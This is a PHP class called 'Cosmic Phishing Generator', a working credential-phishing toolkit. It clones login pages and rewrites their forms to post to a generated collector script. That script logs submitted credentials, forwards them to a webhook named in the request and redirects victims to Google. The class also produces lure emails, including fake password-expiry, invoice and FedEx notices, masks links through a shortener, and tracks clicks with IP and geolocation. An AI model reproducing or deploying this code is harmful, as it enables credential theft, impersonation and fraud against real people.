<?php
/**
 * COSMIC PHISHING GENERATOR v3.0 – INDUSTRIAL‑GRADE ENTERPRISE EDITION
 * Features:
 *   - Advanced page cloning with asset embedding (CSS, images)
 *   - Full SQLite database for campaigns, links, clicks
 *   - Email template library (password reset, invoice, security alert, newsletter, fedex)
 *   - Integrated URL shortener (or external via CosmicUrlMasker)
 *   - Click tracking with IP, user agent, referrer, geolocation (if GeoIP available)
 *   - Webhook notifications on click
 *   - QR code generation for any link
 *   - Export campaign stats as CSV/JSON
 *   - PSR‑3 compatible logging
 *
 * @package    Cosmic\Phishing
 * @version    3.0.0
 */
class PhishingGenerator {

    private $db;
    private $dataDir;
    private $publicDir;
    private $config;
    private $logger;
    private $geoipReader = null;

    public function __construct($config = []) {
        $this->config = array_merge([
            'data_dir'       => dirname(__DIR__, 2) . '/data/phishing/',
            'public_dir'     => dirname(__DIR__, 2) . '/public/phishing/',
            'base_url'       => $this->getBaseUrl(),
            'enable_geoip'   => false,
            'geoip_db'       => dirname(__DIR__, 2) . '/data/geoip/GeoLite2-City.mmdb',
            'max_asset_size' => 5 * 1024 * 1024,
            'webhook_url'    => '',
            'use_shortener'  => true,           // use built‑in shortener; if false, rely on external (e.g., CosmicUrlMasker)
        ], $config);

        $this->dataDir = rtrim($this->config['data_dir'], '/') . '/';
        $this->publicDir = rtrim($this->config['public_dir'], '/') . '/';

        if (!is_dir($this->dataDir)) mkdir($this->dataDir, 0755, true);
        if (!is_dir($this->publicDir)) mkdir($this->publicDir, 0755, true);

        $this->initLogger();
        $this->initDB();
        $this->initGeoIP();
    }

    private function initLogger() {
        $logFile = $this->dataDir . 'generator.log';
        $this->logger = function($level, $message, $context = []) use ($logFile) {
            $entry = sprintf("[%s] %s: %s %s\n",
                date('Y-m-d H:i:s'),
                strtoupper($level),
                $message,
                json_encode($context)
            );
            file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        };
    }

    private function log($level, $message, $context = []) {
        if ($this->logger) {
            ($this->logger)($level, $message, $context);
        }
    }

    private function initDB() {
        $dbPath = $this->dataDir . 'generator.db';
        $this->db = new SQLite3($dbPath);
        $this->db->busyTimeout(5000);
        $this->db->exec('PRAGMA journal_mode = WAL;');

        $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            target_url TEXT,
            clone_path TEXT,
            email_template TEXT,
            created_at INTEGER,
            clicks INTEGER DEFAULT 0,
            submissions INTEGER DEFAULT 0,
            status TEXT DEFAULT 'active'
        )");

        $this->db->exec("CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE NOT NULL,
            target_url TEXT NOT NULL,
            campaign_id INTEGER,
            created_at INTEGER,
            clicks INTEGER DEFAULT 0,
            last_clicked INTEGER,
            password TEXT DEFAULT '',
            expires_at INTEGER,
            max_clicks INTEGER DEFAULT 0,
            FOREIGN KEY(campaign_id) REFERENCES campaigns(id) ON DELETE CASCADE
        )");

        $this->db->exec("CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER,
            ip TEXT,
            user_agent TEXT,
            referer TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            clicked_at INTEGER,
            FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
        )");

        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_links_code ON links(code)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_clicks_link ON clicks(link_id)");
        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_clicks_time ON clicks(clicked_at)");
    }

    private function initGeoIP() {
        if ($this->config['enable_geoip'] && class_exists('GeoIp2\Database\Reader')) {
            if (file_exists($this->config['geoip_db'])) {
                try {
                    $this->geoipReader = new GeoIp2\Database\Reader($this->config['geoip_db']);
                } catch (Exception $e) {
                    $this->log('WARNING', 'GeoIP init failed', ['error' => $e->getMessage()]);
                }
            }
        }
    }

    private function getBaseUrl() {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        return $protocol . '://' . $host;
    }

    // ========== PAGE CLONING ==========

    /**
     * Clone a webpage with full asset embedding.
     */
    public function clonePage($url, $campaignName) {
        $this->log('INFO', 'Starting page clone', ['url' => $url, 'campaign' => $campaignName]);

        $html = $this->fetchUrl($url);
        if ($html === false) {
            throw new RuntimeException("Failed to fetch URL: $url");
        }

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        // Rewrite forms
        foreach ($dom->getElementsByTagName('form') as $form) {
            $form->setAttribute('action', '/phishing/collect');
            $form->setAttribute('method', 'post');
        }

        // Embed assets (CSS, images)
        $this->embedAssets($dom, $url);

        $html = $dom->saveHTML();

        // Save to filesystem
        $safeName = preg_replace('/[^a-z0-9_-]/i', '_', $campaignName);
        $cloneDir = $this->publicDir . 'pages/' . $safeName . '/';
        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
            throw new RuntimeException("Cannot create clone directory: $cloneDir");
        }
        $clonePath = $cloneDir . 'index.html';
        if (file_put_contents($clonePath, $html) === false) {
            throw new RuntimeException("Cannot write clone file: $clonePath");
        }

        $publicPath = '/phishing/pages/' . $safeName . '/';

        // Ensure collector exists
        $this->ensureCollector();

        // Insert into database
        $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, clone_path, created_at) VALUES (:name, :url, :path, :time)");
        $stmt->bindValue(':name', $campaignName, SQLITE3_TEXT);
        $stmt->bindValue(':url', $url, SQLITE3_TEXT);
        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();
        $campaignId = $this->db->lastInsertRowID();

        $this->log('INFO', 'Page cloned successfully', ['campaign_id' => $campaignId, 'path' => $publicPath]);
        return ['campaign_id' => $campaignId, 'clone_path' => $publicPath];
    }

    private function fetchUrl($url) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            CURLOPT_ENCODING => '',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Cache-Control: no-cache',
            ],
        ]);

        $html = curl_exec($ch);
        $error = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($html === false || $httpCode >= 400) {
            $this->log('ERROR', 'cURL fetch failed', ['error' => $error, 'http_code' => $httpCode]);
            return false;
        }
        return $html;
    }

    private function embedAssets($dom, $baseUrl) {
        $baseParts = parse_url($baseUrl);
        $scheme = $baseParts['scheme'] ?? 'http';
        $host = $baseParts['host'] ?? '';

        // Handle CSS <link> tags
        $links = $dom->getElementsByTagName('link');
        foreach ($links as $link) {
            $rel = $link->getAttribute('rel');
            if (strtolower($rel) === 'stylesheet') {
                $href = $link->getAttribute('href');
                if (!$href) continue;
                $cssUrl = $this->resolveUrl($href, $scheme, $host, $baseUrl);
                $cssContent = $this->fetchUrl($cssUrl);
                if ($cssContent) {
                    $cssContent = $this->embedCssAssets($cssContent, $cssUrl, $scheme, $host);
                    $style = $dom->createElement('style', $cssContent);
                    $link->parentNode->replaceChild($style, $link);
                }
            }
        }

        // Handle <img> tags
        $images = $dom->getElementsByTagName('img');
        foreach ($images as $img) {
            $src = $img->getAttribute('src');
            if (!$src) continue;
            $imgUrl = $this->resolveUrl($src, $scheme, $host, $baseUrl);
            $imgData = $this->fetchUrl($imgUrl);
            if ($imgData && strlen($imgData) < $this->config['max_asset_size']) {
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mime = finfo_buffer($finfo, $imgData);
                finfo_close($finfo);
                $dataUri = 'data:' . $mime . ';base64,' . base64_encode($imgData);
                $img->setAttribute('src', $dataUri);
            }
        }

        // Handle background images in style attributes (simplified)
        $elementsWithStyle = $dom->getElementsByTagName('*');
        foreach ($elementsWithStyle as $el) {
            $style = $el->getAttribute('style');
            if (preg_match('/url\([\'"]?([^\'")]+)[\'"]?\)/', $style, $matches)) {
                $assetUrl = $this->resolveUrl($matches[1], $scheme, $host, $baseUrl);
                $assetData = $this->fetchUrl($assetUrl);
                if ($assetData && strlen($assetData) < $this->config['max_asset_size']) {
                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                    $mime = finfo_buffer($finfo, $assetData);
                    finfo_close($finfo);
                    $dataUri = 'data:' . $mime . ';base64,' . base64_encode($assetData);
                    $style = str_replace($matches[0], 'url("' . $dataUri . '")', $style);
                    $el->setAttribute('style', $style);
                }
            }
        }
    }

    private function embedCssAssets($css, $cssUrl, $scheme, $host) {
        return preg_replace_callback('/url\([\'"]?([^\'")]+)[\'"]?\)/', function($m) use ($cssUrl, $scheme, $host) {
            $assetUrl = $this->resolveUrl($m[1], $scheme, $host, $cssUrl);
            $data = $this->fetchUrl($assetUrl);
            if (!$data || strlen($data) >= $this->config['max_asset_size']) return $m[0];
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_buffer($finfo, $data);
            finfo_close($finfo);
            $dataUri = 'data:' . $mime . ';base64,' . base64_encode($data);
            return 'url("' . $dataUri . '")';
        }, $css);
    }

    private function resolveUrl($url, $scheme, $host, $baseUrl) {
        if (preg_match('/^https?:\/\//i', $url)) return $url;
        if (substr($url, 0, 2) === '//') return $scheme . ':' . $url;
        if (substr($url, 0, 1) === '/') return $scheme . '://' . $host . $url;
        $basePath = preg_replace('/\/[^\/]*$/', '/', $baseUrl);
        return $basePath . $url;
    }

    private function ensureCollector() {
        $collectorPath = $this->publicDir . 'collect.php';
        if (!file_exists($collectorPath)) {
            $collector = <<<'EOF'
<?php
require_once __DIR__ . '/../includes/security_functions.php';
$campaign = $_GET['campaign'] ?? $_POST['campaign'] ?? 'unknown';
$data = $_POST;
$logDir = __DIR__ . '/logs/';
if (!is_dir($logDir)) mkdir($logDir, 0755, true);
$logFile = $logDir . $campaign . '.txt';
$entry = date('Y-m-d H:i:s') . ' | ' . json_encode($data) . ' | ' . $_SERVER['REMOTE_ADDR'] . "\n";
file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
// Optional: send webhook
if (isset($_GET['webhook'])) {
    file_get_contents($_GET['webhook'] . '?data=' . urlencode($entry));
}
header('Location: https://www.google.com');
exit;
EOF;
            file_put_contents($collectorPath, $collector);
            $this->log('INFO', 'Collector created', ['path' => $collectorPath]);
        }
    }

    // ========== EMAIL TEMPLATES ==========

    /**
     * Generate a phishing email template.
     */
    public function generateEmailTemplate($type, $targetName, $phishingLink) {
        $templates = [
            'password_reset' => "Subject: Password Expiry Notice\n\nDear $targetName,\n\nYour password has expired. Please reset it immediately: $phishingLink\n\nIT Support",
            'invoice'        => "Subject: Invoice #{rand}\n\nDear $targetName,\n\nPlease find attached invoice #{rand}. Click to view: $phishingLink\n\nFinance Dept",
            'security_alert' => "Subject: Security Alert\n\nDear $targetName,\n\nWe detected unusual activity on your account. Verify now: $phishingLink\n\nSecurity Team",
            'newsletter'     => "Subject: Exclusive Offer\n\nHi $targetName,\n\nCheck out our latest news: $phishingLink\n\nMarketing",
            'fedex'          => "Subject: Package Delivery\n\nDear $targetName,\n\nYour package is waiting. Schedule delivery: $phishingLink\n\nFedEx"
        ];
        $template = $templates[$type] ?? $templates['security_alert'];
        $template = str_replace('{rand}', rand(1000,9999), $template);
        return $template;
    }

    // ========== TRACKING LINKS ==========

    /**
     * Generate a short code (fallback if C2Helper not available).
     */
    private function generateCode($length = 6) {
        $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $max = strlen($chars) - 1;
        $code = '';
        for ($i = 0; $i < $length; $i++) {
            $code .= $chars[random_int(0, $max)];
        }
        return $code;
    }

    /**
     * Create a tracking link (short URL).
     */
    public function createTrackingLink($targetUrl, $campaignId = null, $expiresIn = 0, $maxClicks = 0, $password = '') {
        // Use CosmicUrlMasker if available and configured
        if ($this->config['use_shortener'] && file_exists(dirname(__DIR__) . '/CosmicUrlMasker.php')) {
            require_once dirname(__DIR__) . '/CosmicUrlMasker.php';
            $shortener = new CosmicUrlMasker();
            $result = $shortener->createShortLink($targetUrl, null, $expiresIn, $campaignId, null, $password);
            return $result['short_url'];
        }

        // Fallback: built‑in shortener
        do {
            $code = $this->generateCode(6);
            $exists = $this->db->querySingle("SELECT 1 FROM links WHERE code = '$code'");
        } while ($exists);

        $stmt = $this->db->prepare("INSERT INTO links (code, target_url, campaign_id, created_at, expires_at, max_clicks, password) VALUES (:code, :url, :cid, :time, :expires, :max, :pass)");
        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':expires', $expiresIn ? time() + $expiresIn : null, SQLITE3_INTEGER);
        $stmt->bindValue(':max', $maxClicks, SQLITE3_INTEGER);
        $stmt->bindValue(':pass', $password, SQLITE3_TEXT);
        $stmt->execute();

        return $this->config['base_url'] . '/l/' . $code;
    }

    /**
     * Resolve a short code, log click, and return target URL.
     */
    public function resolveLink($code, $password = null) {
        $stmt = $this->db->prepare("SELECT * FROM links WHERE code = :code");
        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
        $res = $stmt->execute();
        $link = $res->fetchArray(SQLITE3_ASSOC);
        if (!$link) return null;

        // Check expiry
        if ($link['expires_at'] && $link['expires_at'] < time()) return null;
        // Check max clicks
        if ($link['max_clicks'] > 0 && $link['clicks'] >= $link['max_clicks']) return null;
        // Check password
        if (!empty($link['password']) && $password !== $link['password']) return null;

        // GeoIP lookup
        $geo = $this->getGeoIP($_SERVER['REMOTE_ADDR'] ?? '');

        // Log click
        $stmt = $this->db->prepare("INSERT INTO clicks (link_id, ip, user_agent, referer, country, city, latitude, longitude, clicked_at) VALUES (:link_id, :ip, :ua, :ref, :country, :city, :lat, :lon, :time)");
        $stmt->bindValue(':link_id', $link['id'], SQLITE3_INTEGER);
        $stmt->bindValue(':ip', $_SERVER['REMOTE_ADDR'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ua', $_SERVER['HTTP_USER_AGENT'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ref', $_SERVER['HTTP_REFERER'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':country', $geo['country'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':city', $geo['city'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':lat', $geo['latitude'] ?? 0, SQLITE3_FLOAT);
        $stmt->bindValue(':lon', $geo['longitude'] ?? 0, SQLITE3_FLOAT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();

        // Update link clicks
        $this->db->exec("UPDATE links SET clicks = clicks + 1, last_clicked = " . time() . " WHERE id = " . $link['id']);

        // Update campaign clicks if linked
        if ($link['campaign_id']) {
            $this->db->exec("UPDATE campaigns SET clicks = clicks + 1 WHERE id = " . $link['campaign_id']);
        }

        // Fire webhook if configured
        if (!empty($this->config['webhook_url'])) {
            $this->fireWebhook($link, $geo);
        }

        return $link['target_url'];
    }

    private function getGeoIP($ip) {
        if (!$this->geoipReader || $ip === '127.0.0.1' || $ip === '::1') {
            return ['country' => 'Local', 'city' => 'Localhost'];
        }
        try {
            $record = $this->geoipReader->city($ip);
            return [
                'country'   => $record->country->name,
                'city'      => $record->city->name,
                'latitude'  => $record->location->latitude,
                'longitude' => $record->location->longitude,
            ];
        } catch (Exception $e) {
            return ['country' => 'Unknown', 'city' => 'Unknown'];
        }
    }

    private function fireWebhook($link, $geo) {
        $payload = json_encode([
            'event'      => 'click',
            'link_id'    => $link['id'],
            'code'       => $link['code'],
            'target'     => $link['target_url'],
            'ip'         => $_SERVER['REMOTE_ADDR'] ?? '',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'geo'        => $geo,
            'time'       => time(),
        ]);
        $ch = curl_init($this->config['webhook_url']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    // ========== QR CODE ==========

    /**
     * Generate QR code image URL for a short code.
     */
    public function generateQRCode($code, $size = 150) {
        $shortUrl = $this->config['base_url'] . '/l/' . $code;
        return 'https://api.qrserver.com/v1/create-qr-code/?size=' . $size . 'x' . $size . '&data=' . urlencode($shortUrl);
    }

    // ========== STATISTICS ==========

    /**
     * Get campaign details.
     */
    public function getCampaign($id) {
        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }

    /**
     * List all campaigns.
     */
    public function getCampaigns() {
        $res = $this->db->query("SELECT * FROM campaigns ORDER BY created_at DESC");
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    /**
     * Get link statistics for a campaign.
     */
    public function getCampaignStats($campaignId) {
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) return null;

        $stmt = $this->db->prepare("SELECT COUNT(*) FROM links WHERE campaign_id = :cid");
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $links = $stmt->execute()->fetchArray(SQLITE3_NUM)[0];

        $stmt = $this->db->prepare("SELECT SUM(clicks) FROM links WHERE campaign_id = :cid");
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $totalClicks = $stmt->execute()->fetchArray(SQLITE3_NUM)[0] ?? 0;

        return [
            'campaign'      => $campaign,
            'total_links'   => $links,
            'total_clicks'  => $totalClicks,
            'campaign_clicks' => $campaign['clicks'],
        ];
    }

    /**
     * Export link clicks as CSV.
     */
    public function exportClicks($campaignId = null, $format = 'csv') {
        if ($campaignId) {
            $stmt = $this->db->prepare("
                SELECT c.*, l.code, l.target_url 
                FROM clicks c
                JOIN links l ON c.link_id = l.id
                WHERE l.campaign_id = :cid
                ORDER BY c.clicked_at DESC
            ");
            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        } else {
            $stmt = $this->db->prepare("
                SELECT c.*, l.code, l.target_url 
                FROM clicks c
                JOIN links l ON c.link_id = l.id
                ORDER BY c.clicked_at DESC
            ");
        }
        $res = $stmt->execute();
        $rows = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row;

        if ($format === 'csv') {
            $output = fopen('php://temp', 'w');
            if (!empty($rows)) {
                fputcsv($output, array_keys($rows[0]));
                foreach ($rows as $row) {
                    fputcsv($output, $row);
                }
            }
            rewind($output);
            return stream_get_contents($output);
        } elseif ($format === 'json') {
            return json_encode($rows, JSON_PRETTY_PRINT);
        }
        return '';
    }

    /**
     * Delete a campaign and all associated links/clicks.
     */
    public function deleteCampaign($campaignId) {
        $this->db->exec("BEGIN TRANSACTION");
        try {
            // Get all link ids for this campaign
            $links = $this->db->query("SELECT id FROM links WHERE campaign_id = $campaignId");
            while ($link = $links->fetchArray(SQLITE3_ASSOC)) {
                $this->db->exec("DELETE FROM clicks WHERE link_id = " . $link['id']);
            }
            $this->db->exec("DELETE FROM links WHERE campaign_id = $campaignId");
            $this->db->exec("DELETE FROM campaigns WHERE id = $campaignId");
            $this->db->exec("COMMIT");
        } catch (Exception $e) {
            $this->db->exec("ROLLBACK");
            throw $e;
        }
    }
}
